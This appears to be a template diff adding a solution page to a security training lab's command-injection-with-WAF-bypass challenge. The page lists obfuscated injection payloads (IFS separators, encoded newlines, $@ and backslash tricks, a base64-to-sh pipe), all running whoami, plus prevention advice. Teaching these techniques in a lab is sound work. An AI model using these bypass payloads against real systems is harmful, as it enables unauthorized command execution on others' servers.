@@ -1,0 +1,86 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection with WAF Bypass - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection with WAF Bypass</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Bypass Web Application Firewall (WAF) protections to exploit command injection.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in an environment protected by a Web Application Firewall (WAF). The WAF blocks common command injection patterns, requiring advanced bypass techniques.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Identify WAF blocking:</strong> Try basic payloads and observe WAF blocking messages.</p>
+                        <pre class="bg-light p-3 rounded"><code>test; whoami</code></pre>
+                        <p>This will likely be blocked by the WAF.</p>
+                    </li>
+                    <li>
+                        <p><strong>Use encoding techniques:</strong> Try URL encoding to bypass filters.</p>
+                        <pre class="bg-light p-3 rounded"><code>test%3B%20whoami</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Use alternative separators:</strong> Try different command separators.</p>
+                        <pre class="bg-light p-3 rounded"><code>test${IFS}&&${IFS}whoami</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Use variable expansion:</strong> Use shell variable expansion to obfuscate commands.</p>
+                        <pre class="bg-light p-3 rounded"><code>test && w${IFS}h${IFS}o${IFS}a${IFS}m${IFS}i</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">WAF Bypass Techniques</h3>
+                <ul>
+                    <li><code>test${IFS}&&${IFS}whoami</code> - Using IFS variable</li>
+                    <li><code>test%0a%0dwhoami</code> - Using newline characters</li>
+                    <li><code>test&&w$@h$@o$@a$@m$@i</code> - Using $@ expansion</li>
+                    <li><code>test&&who$()ami</code> - Using empty command substitution</li>
+                    <li><code>test&&\w\h\o\a\m\i</code> - Using backslash escaping</li>
+                </ul>
+
+                <h3 class="mt-4">Advanced Bypass Methods</h3>
+                <ul>
+                    <li><strong>Case manipulation:</strong> <code>test && WhOaMi</code></li>
+                    <li><strong>Tab characters:</strong> <code>test	&&	whoami</code></li>
+                    <li><strong>Unicode encoding:</strong> Using Unicode characters</li>
+                    <li><strong>Base64 encoding:</strong> <code>test && echo d2hvYW1p | base64 -d | sh</code></li>
+                </ul>
+
+                <h3 class="mt-4">Modern WAF Solutions</h3>
+                <p>Common WAFs that might block command injection:</p>
+                <ul>
+                    <li>Cloudflare WAF</li>
+                    <li>AWS WAF</li>
+                    <li>ModSecurity</li>
+                    <li>Imperva</li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Defense in Depth:</strong> Don't rely solely on WAF protection</li>
+                    <li><strong>Input Validation:</strong> Implement proper input validation at application level</li>
+                    <li><strong>WAF Tuning:</strong> Regularly update and tune WAF rules</li>
+                    <li><strong>Code Review:</strong> Review code for command injection vulnerabilities</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level11') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
